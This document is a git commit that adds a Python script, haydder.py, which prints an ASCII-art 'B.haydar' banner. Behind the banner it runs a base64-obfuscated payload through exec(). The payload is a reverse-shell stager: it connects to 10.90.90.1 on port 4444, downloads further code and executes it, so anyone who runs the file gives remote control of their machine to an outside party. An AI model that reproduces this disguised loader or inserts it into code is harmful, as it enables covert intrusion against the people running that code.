dde6bb4a80eb3b23aecfefc484c082299f06ea41
haydar131 <33578009+haydar131@users.noreply.github.com>
2018-02-11 20:22:02 +0300

    Add files via upload

---
+++ haydder.py
@@ -0,0 +1,16 @@
+print \
+"""
+888888b.       888                             888                  
+888  "88b      888                             888                  
+888  .88P      888                             888                  
+8888888K.      88888b.   8888b.  888  888  .d88888  8888b.  888d888 
+888  "Y88b     888 "88b     "88b 888  888 d88" 888     "88b 888P"   
+888    888     888  888 .d888888 888  888 888  888 .d888888 888     
+888   d88P d8b 888  888 888  888 Y88b 888 Y88b 888 888  888 888     
+8888888P"  Y8P 888  888 "Y888888  "Y88888  "Y88888 "Y888888 888     
+                                      888                           
+                                 Y8b d88P                           
+                                  "Y88P"                            
+                                                                    
+ """
+import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('aW1wb3J0IHNvY2tldCxzdHJ1Y3QsdGltZQpmb3IgeCBpbiByYW5nZSgxMCk6Cgl0cnk6CgkJcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQoJCXMuY29ubmVjdCgoJzEwLjkwLjkwLjEnLDQ0NDQpKQoJCWJyZWFrCglleGNlcHQ6CgkJdGltZS5zbGVlcCg1KQpsPXN0cnVjdC51bnBhY2soJz5JJyxzLnJlY3YoNCkpWzBdCmQ9cy5yZWN2KGwpCndoaWxlIGxlbihkKTxsOgoJZCs9cy5yZWN2KGwtbGVuKGQpKQpleGVjKGQseydzJzpzfSkK')))
